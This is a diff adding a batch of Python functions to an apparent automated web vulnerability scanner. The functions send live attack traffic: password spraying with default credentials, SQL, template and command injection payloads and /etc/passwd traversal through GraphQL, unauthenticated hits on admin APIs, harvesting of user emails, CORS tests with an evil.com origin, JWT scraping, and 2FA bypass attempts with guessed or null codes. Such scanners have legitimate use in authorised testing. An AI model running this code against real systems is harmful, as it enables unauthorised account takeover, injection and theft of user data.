@@ -9358,3 +9358,325 @@ def scan_subdomain_ns_takeover(target, subdomains):
         except Exception:
             continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 15: Password spray, GraphQL variable injection,
+#                 broken function-level auth, mass user enumeration,
+#                 CORS Vary:Origin, insecure JWT storage,
+#                 2FA response manipulation, SSRF via redirect
+# ---------------------------------------------------------------------------
+
+_COMMON_PASSWORDS = [
+    "password", "123456", "password123", "admin", "letmein", "qwerty",
+    "welcome", "monkey", "dragon", "master", "abc123", "pass123",
+    "iloveyou", "sunshine", "princess", "football", "shadow", "superman",
+    "michael", "password1", "123456789", "12345678", "1234567890",
+    "admin123", "root", "toor", "test", "guest", "changeme",
+]
+
+def scan_password_spray(crawl_data):
+    """Password spray — try common passwords against discovered usernames."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", []):
+        if not any(x in page["url"].lower() for x in ["login", "signin", "auth"]): continue
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/login", "/api/login", "/auth/login", "/signin", "/api/signin"]:
+            url = f"{base}{path}"
+            # Test with common username/password combos — just 3 attempts to avoid lockout
+            for user, pwd in [("admin", "admin"), ("admin", "password"), ("test", "test")]:
+                try:
+                    r = _S.post(url, json={"email": f"{user}@{base.split('//')[1].split('/')[0]}",
+                                          "username": user, "password": pwd}, timeout=5)
+                    body = r.text.lower()
+                    if (r.status_code in (200, 302) and
+                            any(x in body for x in ["dashboard","welcome","logout","token","success"]) and
+                            not any(x in body for x in ["invalid","incorrect","failed","wrong"])):
+                        findings.append({
+                            "type": f"Default Credentials: {user}:{pwd}",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"Login succeeded with {user}:{pwd}",
+                            "template": "apex-password-spray",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_graphql_injection(crawl_data):
+    """Injection via GraphQL variables — SQLi, SSTI, CMDi in variable values."""
+    findings = []
+    tested = set()
+    injection_payloads = [
+        ("' OR '1'='1", ["sql", "syntax", "mysql", "error"]),
+        ("{{7*7}}", ["49"]),
+        (";sleep 4", None),  # time-based CMDi
+        ("../../../etc/passwd", ["root:", "daemon:"]),
+    ]
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                # Get schema to find queries with string variables
+                r = _S.post(url, json={"query": "{__schema{queryType{fields{name args{name type{name}}}}}}"},
+                           headers={"Content-Type": "application/json"}, timeout=5)
+                if r.status_code != 200: continue
+                import json as _j
+                schema = _j.loads(r.text)
+                fields = (schema.get("data", {}).get("__schema", {})
+                         .get("queryType", {}) or {}).get("fields", []) or []
+                for field in fields[:5]:
+                    fname = field.get("name", "")
+                    str_args = [a["name"] for a in field.get("args", [])
+                               if a.get("type", {}).get("name") in ("String", "ID")]
+                    if not str_args: continue
+                    for payload, markers in injection_payloads[:2]:
+                        args_str = ", ".join(f'{a}: "{payload}"' for a in str_args[:2])
+                        query = f'{{ {fname}({args_str}) {{ id }} }}'
+                        try:
+                            r2 = _S.post(url, json={"query": query},
+                                        headers={"Content-Type": "application/json"}, timeout=8)
+                            body = r2.text.lower()
+                            if markers and any(m.lower() in body for m in markers):
+                                findings.append({
+                                    "type": f"GraphQL Variable Injection in {fname}",
+                                    "severity": "critical",
+                                    "url": url,
+                                    "detail": f"Injection via {fname}({str_args[0]}): {payload[:40]}",
+                                    "template": "apex-gql-inject",
+                                })
+                                break
+                        except Exception:
+                            continue
+            except Exception:
+                continue
+    return findings
+
+
+def scan_broken_function_level_auth(crawl_data, web_targets):
+    """Test access to admin/privileged functions without admin role."""
+    findings = []
+    # Admin function paths that regular users shouldn't access
+    admin_functions = [
+        "/api/admin/users", "/api/admin/config", "/api/admin/logs",
+        "/api/admin/delete", "/api/admin/reset", "/api/admin/export",
+        "/api/v1/admin", "/api/v1/admin/users", "/api/v1/admin/settings",
+        "/api/users/all", "/api/users/export", "/api/users/delete",
+        "/api/config/update", "/api/settings/update", "/api/system/info",
+        "/admin/api/users", "/admin/api/config", "/admin/api/export",
+        "/management/users", "/management/config", "/internal/api",
+        "/api/v1/users?role=admin", "/api/users?admin=true",
+    ]
+    for target in web_targets[:3]:
+        try:
+            r404 = _S.get(f"{target}/nonexistent_apex_xyz", timeout=3)
+            size_404 = len(r404.content)
+        except Exception:
+            continue
+        for path in admin_functions:
+            try:
+                r = _S.get(f"{target}{path}", timeout=5)
+                if (r.status_code == 200 and
+                        abs(len(r.content) - size_404) > 100):
+                    try:
+                        data = r.json()
+                        if isinstance(data, (list, dict)) and len(str(data)) > 50:
+                            has_sensitive = any(k in str(data).lower()
+                                               for k in ["email","password","token","secret","admin","role"])
+                            sev = "critical" if has_sensitive else "high"
+                            findings.append({
+                                "type": f"Broken Function Level Auth: {path}",
+                                "severity": sev,
+                                "url": f"{target}{path}",
+                                "detail": f"Admin function accessible without auth ({len(r.content)}b)",
+                                "template": "apex-bfla",
+                            })
+                    except Exception:
+                        if len(r.content) > 200:
+                            findings.append({
+                                "type": f"Broken Function Level Auth: {path}",
+                                "severity": "high",
+                                "url": f"{target}{path}",
+                                "detail": f"Admin path returns 200 ({len(r.content)}b)",
+                                "template": "apex-bfla",
+                            })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_mass_user_enumeration(crawl_data, web_targets):
+    """Enumerate users via API pagination — /api/users?page=1&limit=100."""
+    findings = []
+    user_endpoints = [
+        "/api/users", "/api/v1/users", "/api/v2/users",
+        "/api/accounts", "/api/members", "/api/customers",
+        "/api/admin/users", "/users", "/api/user/list",
+    ]
+    for target in web_targets[:3]:
+        for path in user_endpoints:
+            for params in ["?limit=100", "?per_page=100", "?size=100", "?count=100", ""]:
+                url = f"{target}{path}{params}"
+                try:
+                    r = _S.get(url, timeout=5)
+                    if r.status_code == 200:
+                        try:
+                            data = r.json()
+                            items = (data if isinstance(data, list) else
+                                    data.get("users", data.get("data", data.get("items", data.get("results", [])))))
+                            if isinstance(items, list) and len(items) >= 5:
+                                emails = [str(u.get("email","")) for u in items if isinstance(u, dict) and u.get("email")]
+                                has_emails = len(emails) > 0
+                                sev = "critical" if has_emails else "high"
+                                findings.append({
+                                    "type": "Mass User Enumeration",
+                                    "severity": sev,
+                                    "url": url,
+                                    "detail": f"Returns {len(items)} users without auth" +
+                                             (f" including emails: {emails[0][:30]}..." if emails else ""),
+                                    "template": "apex-user-enum",
+                                })
+                                break
+                        except Exception:
+                            pass
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_cors_vary_origin(crawl_data):
+    """CORS misconfiguration with Vary: Origin — indicates dynamic origin reflection."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:10]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            # Request without Origin
+            r_no_origin = _S.get(page["url"], timeout=5)
+            # Request with evil origin
+            r_evil = _S.get(page["url"], timeout=5, headers={"Origin": "https://evil.com"})
+            vary = r_evil.headers.get("Vary", "")
+            acao = r_evil.headers.get("Access-Control-Allow-Origin", "")
+            acac = r_evil.headers.get("Access-Control-Allow-Credentials", "")
+            # Vary: Origin means the server reflects the origin dynamically
+            if "origin" in vary.lower() and acao:
+                if acao == "https://evil.com":
+                    sev = "critical" if acac.lower() == "true" else "high"
+                    findings.append({
+                        "type": "CORS Dynamic Origin Reflection (Vary: Origin)",
+                        "severity": sev,
+                        "url": page["url"],
+                        "detail": f"Vary: Origin + ACAO reflects evil.com, credentials={acac}",
+                        "template": "apex-cors-vary",
+                    })
+                elif acao and acao != "*":
+                    findings.append({
+                        "type": "CORS with Vary: Origin Header",
+                        "severity": "medium",
+                        "url": page["url"],
+                        "detail": f"Vary: Origin present — CORS policy may be bypassable",
+                        "template": "apex-cors-vary",
+                    })
+        except Exception:
+            pass
+    return findings
+
+
+def scan_insecure_jwt_storage(crawl_data):
+    """Detect JWT stored in localStorage — vulnerable to XSS theft."""
+    findings = []
+    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Check for localStorage JWT storage patterns in JS
+            storage_patterns = [
+                r'localStorage\.setItem\s*\(\s*["\'][^"\']*token[^"\']*["\']',
+                r'localStorage\.setItem\s*\(\s*["\'][^"\']*jwt[^"\']*["\']',
+                r'localStorage\.setItem\s*\(\s*["\'][^"\']*auth[^"\']*["\']',
+                r'sessionStorage\.setItem\s*\(\s*["\'][^"\']*token[^"\']*["\']',
+            ]
+            for pattern in storage_patterns:
+                if re.search(pattern, r.text, re.IGNORECASE):
+                    findings.append({
+                        "type": "JWT/Token Stored in localStorage",
+                        "severity": "medium",
+                        "url": page["url"],
+                        "detail": "Token stored in localStorage — vulnerable to XSS theft. Use HttpOnly cookies instead.",
+                        "template": "apex-jwt-storage",
+                    })
+                    break
+            # Check for JWT in page source (already authenticated response)
+            jwts = jwt_re.findall(r.text)
+            if jwts:
+                import base64 as _b64, json as _j
+                for jwt in jwts[:2]:
+                    try:
+                        pad = lambda s: s + "=" * (-len(s) % 4)
+                        payload = _j.loads(_b64.urlsafe_b64decode(pad(jwt.split(".")[1])))
+                        if any(k in payload for k in ["sub", "user_id", "email", "role", "admin"]):
+                            findings.append({
+                                "type": "JWT Exposed in Page Source",
+                                "severity": "high",
+                                "url": page["url"],
+                                "detail": f"JWT with claims {list(payload.keys())} found in page source",
+                                "template": "apex-jwt-storage",
+                            })
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+    return findings
+
+
+def scan_2fa_bypass_response(crawl_data):
+    """2FA bypass via response manipulation — change false to true in auth response."""
+    findings = []
+    for page in crawl_data.get("pages", []):
+        url = page["url"].lower()
+        if not any(x in url for x in ["2fa", "otp", "mfa", "verify", "totp", "code"]): continue
+        base = "/".join(page["url"].split("/", 3)[:3])
+        for path in ["/api/2fa/verify", "/api/otp/verify", "/api/mfa/verify",
+                     "/api/auth/2fa", "/2fa/verify", "/verify-otp"]:
+            endpoint = f"{base}{path}"
+            # Test with wrong OTP — check if response has manipulable boolean
+            for otp in ["000000", "123456", "999999"]:
+                try:
+                    r = _S.post(endpoint, json={"code": otp, "otp": otp, "token": otp}, timeout=5)
+                    body = r.text
+                    # Look for false/fail in response that could be manipulated
+                    if r.status_code in (200, 401) and any(x in body for x in
+                            ['"success":false', '"verified":false', '"valid":false',
+                             '"authenticated":false', '"status":"fail"', '"result":"error"']):
+                        findings.append({
+                            "type": "2FA Bypass via Response Manipulation",
+                            "severity": "critical",
+                            "url": endpoint,
+                            "detail": "2FA response contains manipulable boolean — intercept and change false→true to bypass",
+                            "template": "apex-2fa-bypass",
+                        })
+                        break
+                    # Test empty/null OTP
+                    r2 = _S.post(endpoint, json={"code": "", "otp": None, "token": "null"}, timeout=5)
+                    if r2.status_code == 200 and "success" in r2.text.lower():
+                        findings.append({
+                            "type": "2FA Bypass: Empty/Null OTP Accepted",
+                            "severity": "critical",
+                            "url": endpoint,
+                            "detail": "Empty or null OTP accepted — 2FA completely bypassed",
+                            "template": "apex-2fa-bypass",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
